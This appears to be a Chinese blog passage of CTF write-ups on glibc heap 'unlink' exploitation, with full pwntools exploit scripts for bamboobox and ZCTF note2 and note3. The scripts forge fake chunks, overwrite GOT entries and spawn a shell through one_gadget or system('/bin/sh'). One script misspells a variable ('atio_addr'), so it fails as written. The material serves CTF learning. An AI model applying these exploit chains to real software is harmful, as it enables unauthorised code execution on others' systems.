<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    unlink |
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  

<article id="post-unlink" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      unlink
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/02/18/unlink/" class="article-date">
  <time datetime="2020-02-18T14:44:29.000Z" itemprop="datePublished">2020-02-18</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>把ctf wiki里的unlink题简单的做了一下<br>先简单的记录一下，以后吃透了再回来好好的填填坑</p>
<p>理解了一下unlink的操作<br>就是构造一个chunk，例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x1302000:	0x0000000000000000	0x0000000000000051</span><br><span class="line">0x1302010:	0x0000000000000000	0x0000000000000040  #fack_chunk（构造成一个free掉的样子）  0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x11</span><br><span class="line">0x1302020:	0x00000000006030d0	0x00000000006030d8</span><br><span class="line">0x1302030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1302040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x1302050:	0x0000000000000040	0x00000000000000a0  #p位改成0，free下一个chunk之后会与上一个chunk合并</span><br><span class="line">0x1302060:	0x654420746f626f52	0x00000000006c6976</span><br><span class="line">0x1302070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1302080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1302090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13020d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13020e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x13020f0:	0x0000000000000000	0x0000000000020f11</span><br></pre></td></tr></table></figure>

<a id="more"></a>


<h2 id="Hitcon-training-lab11-bamboobox"><a href="#Hitcon-training-lab11-bamboobox" class="headerlink" title="Hitcon-training lab11 bamboobox"></a>Hitcon-training lab11 bamboobox</h2><p>unlink的很重要一个条件就是已知存储各个堆块地址的位置。</p>
<p>unlink操作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(0x80,&apos;aaaaaa&apos;) #chunk0</span><br><span class="line">add(0x80,&apos;bbbbbb&apos;) #chunk1</span><br><span class="line">add(0x80,&apos;cccccc&apos;) #chunk2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = 0x6020c8</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line"></span><br><span class="line"># fack chunk（构造成被free掉的样子</span><br><span class="line">pay = p64(0) + p64(0x81) </span><br><span class="line">pay += p64(fd)</span><br><span class="line">pay += p64(bk)</span><br><span class="line">pay += &apos;a&apos;*0x60</span><br><span class="line">pay += p64(0x80)+p64(0x90)</span><br><span class="line"># gdb.attach(r)</span><br><span class="line">modify(0,0x90,pay)</span><br><span class="line">remove(1)  #free chunk1，使chunk1往前合并,触发unlink</span><br></pre></td></tr></table></figure>

<p>则chunk0就变成了发错fack_chunk里面的fd和bk，所指向的target<br>改target的内容为我们想覆写的一个got表地址，这样show的时候也可以leak出libc来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;\x00&apos;*0x10+ p64(0x80) + p64(0x602068) #把atoi的got表地址覆写成chunk0里面</span><br><span class="line">modify(0,0x60,payload)</span><br><span class="line">show()</span><br><span class="line">r.recvuntil(&quot;0 : &quot;) </span><br><span class="line">atoi_addr = u64(r.recv(6).ljust(8,&quot;\x00&quot;)) </span><br><span class="line">print hex(atio_addr)</span><br><span class="line">libc_base=atoi_addr-0x36E80</span><br><span class="line">print hex(libc_base)</span><br><span class="line">one_gadget = libc_base + 0xf02a4</span><br><span class="line"></span><br><span class="line">modify(0,0x8,p64(one_gadget)) #把atoi got表里的内容改为one gadget</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">r=process(&apos;./bamboobox&apos;)</span><br><span class="line">elf=ELF(&apos;./bamboobox&apos;)</span><br><span class="line"></span><br><span class="line"># r = remote(host,port)</span><br><span class="line"></span><br><span class="line">def add(length,name):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;Please enter the length of item name:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line">def modify(idx,length,name):</span><br><span class="line">    r.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line">    r.recvuntil(&quot;Please enter the index of item:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(0x80,&apos;aaaaaa&apos;)</span><br><span class="line">add(0x80,&apos;bbbbbb&apos;)</span><br><span class="line">add(0x80,&apos;cccccc&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = 0x6020c8</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line"></span><br><span class="line"># pay =&apos;a&apos;*0x10</span><br><span class="line">pay = p64(0) + p64(0x81) </span><br><span class="line">pay += p64(fd)</span><br><span class="line">pay += p64(bk)</span><br><span class="line">pay += &apos;a&apos;*0x60</span><br><span class="line">pay += p64(0x80)+p64(0x90)</span><br><span class="line"># gdb.attach(r)</span><br><span class="line">modify(0,0x90,pay)</span><br><span class="line">remove(1)</span><br><span class="line"></span><br><span class="line">payload = &apos;\x00&apos;*0x10+ p64(0x80) + p64(0x602068)</span><br><span class="line"></span><br><span class="line">modify(0,0x60,payload)</span><br><span class="line">show()</span><br><span class="line"># r.recv()</span><br><span class="line">r.recvuntil(&quot;0 : &quot;)</span><br><span class="line">atoi_addr = u64(r.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">print hex(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base=atio_addr-0x36E80</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + 0xf02a4</span><br><span class="line">system = libc_base + 0x45390</span><br><span class="line"># r.recv()</span><br><span class="line"># modify(0,0x8,p64(system))</span><br><span class="line">modify(0,0x8,p64(one_gadget))</span><br><span class="line"># r.recvuntil(&quot;:&quot;)</span><br><span class="line"># r.sendline(&quot;$0&quot;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h2><p>unlink来说就是构造一个fack_chunk（为free完的样子）如果可以overlap的话，直接写在下一个chunk的top，size的p位为0，如果不可以的overlap的话，就是这题一样，利用两个chunk来构造一个fack_chunk，free掉fack_chunk后面那个chunk，使之合并，触发unlink。</p>
<p>和lab11差不多的方法</p>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">p = process(&apos;./note2&apos;)</span><br><span class="line">elf = ELF(&apos;./note2&apos;)</span><br><span class="line"></span><br><span class="line">def add(length, content):</span><br><span class="line">    p.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;(less than 128)&apos;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&apos;content:&apos;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(id):</span><br><span class="line">    p.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;note:&apos;)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(id, choice, s):</span><br><span class="line">    p.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;note:&apos;)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(&apos;2.append]&apos;)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def free(id):</span><br><span class="line">    p.recvuntil(&apos;option---&gt;&gt;&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;note:&apos;)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Input your name:\n&quot;)</span><br><span class="line">p.sendline(&quot;aaaa&quot;)</span><br><span class="line">p.recvuntil(&quot;Input your address:\n&quot;)</span><br><span class="line">p.sendline(&quot;bbbb&quot;)</span><br><span class="line"></span><br><span class="line">target = 0x602120#prt</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target -0x10</span><br><span class="line"></span><br><span class="line">payload = p64(0)+p64(0x60)</span><br><span class="line">payload += p64(fd)+p64(bk)</span><br><span class="line">payload += &apos;a&apos;*0x20</span><br><span class="line"></span><br><span class="line">add(0x40,payload)#0</span><br><span class="line">add(0,&apos;bbbb&apos;)#1</span><br><span class="line">add(0x80,&apos;cccc&apos;)#2</span><br><span class="line"></span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload1=&apos;a&apos;*0x10</span><br><span class="line">payload1+=p64(0x60)+p64(0x90)</span><br><span class="line">add(0,payload1)#1</span><br><span class="line">free(2)</span><br><span class="line"></span><br><span class="line">atoi=elf.got[&apos;atoi&apos;]</span><br><span class="line">payload2 =&apos;a&apos;*0x18+p64(atoi)#prt-0x18 start</span><br><span class="line">edit(0,1,payload2)#0</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&apos;is &apos;)</span><br><span class="line">atoi_addr = u64(p.recvuntil(&quot;\n&quot;,drop=True).ljust(8,&quot;\00&quot;))</span><br><span class="line">offset_addr=atoi_addr-libc.sym[&apos;atoi&apos;]</span><br><span class="line">print hex(offset_addr)</span><br><span class="line">print hex(atoi_addr)</span><br><span class="line">one_gadget=offset_addr+0xf1147</span><br><span class="line"></span><br><span class="line">edit(0,1,p64(one_gadget))</span><br><span class="line">p.sendline(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2016-zctf-note3"><a href="#2016-zctf-note3" class="headerlink" title="2016 zctf note3"></a>2016 zctf note3</h2><p>和note2比，它就少了个show，但是我们可以利用puts函数来leak<br>就有就往fack_chunk里面写入free和puts两个函数的got值的操作，leak puts</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">sh=process(&apos;./note3&apos;)</span><br><span class="line"># sh=remote(&apos;127.0.0.1&apos;,9999)</span><br><span class="line">elf=ELF(&apos;./note3&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"> </span><br><span class="line">def add(size,content):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;1024)\n&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;content:\n&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:\n&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;ent:\n&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:\n&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = 0x6020c8#prt</span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target -0x10</span><br><span class="line"></span><br><span class="line">payload = p64(0)+p64(0x60)</span><br><span class="line">payload += p64(fd)+p64(bk)</span><br><span class="line">payload += &apos;a&apos;*0x20</span><br><span class="line"></span><br><span class="line">add(0x40,payload)#0</span><br><span class="line">add(0,&apos;bbbb&apos;)#1</span><br><span class="line">add(0x80,&apos;cccc&apos;)#2</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">payload1=&apos;a&apos;*0x10</span><br><span class="line">payload1+=p64(0x60)+p64(0x90)</span><br><span class="line">add(0,payload1)#1</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">free=elf.got[&apos;free&apos;]</span><br><span class="line">put_gots = elf.got[&apos;puts&apos;]</span><br><span class="line">payload2 =&apos;a&apos;*0x18 + p64(free) + p64(put_gots)#prt-0x18 start</span><br><span class="line">edit(0,payload2)#0</span><br><span class="line">puts_plt = elf.sym[&apos;puts&apos;]</span><br><span class="line">edit(0,p64(puts_plt)[:-1]) # 解决了只能包含“\n”只能发送八个字节的问题</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(sh.recvuntil(&quot;\nDelete success\n&quot;,drop=True).ljust(8,&quot;\00&quot;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">print hex(libc_base)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + 0xf1147</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">edit(0,p64(one_gadget)[:-1])</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"># add(0x88,&apos;aaaa&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">另一种方法，是用了edit里面id的整数溢出，用复数使chunk可以直接overlap</span><br><span class="line">然后改free的got为system（这个是把chunk0覆写成free got的地址，再edit一次0，就可以写system写进got表），再把binsh的地址写在原本是chunk0地址的地方，free的时候，拿chunk0当参数就可以实现system(&apos;/bin/sh&apos;)（one_gadget其实更方便一点）</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level =&apos;DEBUG&apos;</span><br><span class="line">sh=process(&apos;./note3&apos;)</span><br><span class="line"># sh=remote(&apos;127.0.0.1&apos;,9999)</span><br><span class="line">elf=ELF(&apos;./note3&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"> </span><br><span class="line">def newnote(size,content):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;1024)\n&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;content:\n&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def editnote(index,content):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:\n&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;ent:\n&apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def delnote(index):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt;\n&apos;)</span><br><span class="line">    sh.sendline(&apos;4&apos;)</span><br><span class="line">    sh.recvuntil(&apos;note:\n&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">newnote(0x80,&apos;aaaaaa&apos;)</span><br><span class="line">newnote(0x80,&apos;aaaaaa&apos;)</span><br><span class="line">newnote(0x80,&apos;aaaaaa&apos;)</span><br><span class="line">newnote(0x80,&apos;aaaaaa&apos;)</span><br><span class="line">newnote(0x80,&apos;aaaaaa&apos;)</span><br><span class="line">newnote(0x80,&apos;aaaaaa&apos;)</span><br><span class="line">newnote(0x80,&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">inter=-9223372036854775808</span><br><span class="line">payload=p64(0)</span><br><span class="line">payload+=p64(0x81)</span><br><span class="line">payload+=p64(0x6020e0-0x18)</span><br><span class="line">payload+=p64(0x6020e0-0x10)</span><br><span class="line">payload=payload.ljust(0x80,&apos;a&apos;)</span><br><span class="line">payload+=p64(0x80)</span><br><span class="line">payload+=p64(0x90)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">editnote(3,&apos;a&apos;)</span><br><span class="line">editnote(inter,payload) #editnote(-1,payload) 此時size為note6地址 改的是chunk3</span><br><span class="line">delnote(4)</span><br><span class="line"></span><br><span class="line">free_got=elf.got[&apos;free&apos;]</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">atol_got=elf.got[&apos;atol&apos;]</span><br><span class="line">puts_got=elf.got[&apos;puts&apos;]</span><br><span class="line"></span><br><span class="line">editnote(3,p64(free_got)+p64(puts_got))</span><br><span class="line">editnote(0,p64(puts_plt)[:-1])</span><br><span class="line">delnote(1)</span><br><span class="line">puts_adr=sh.recvuntil(&apos;\nDelete success\n&apos;,drop=True).ljust(8,&apos;\x00&apos;)</span><br><span class="line">puts_adr=u64(puts_adr)</span><br><span class="line">print &apos;puts_adr: &apos;+hex(puts_adr)</span><br><span class="line"> </span><br><span class="line">libc_base=puts_adr-libc.symbols[&apos;puts&apos;]</span><br><span class="line">sys_adr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_adr=libc_base+libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_base)</span><br><span class="line">print 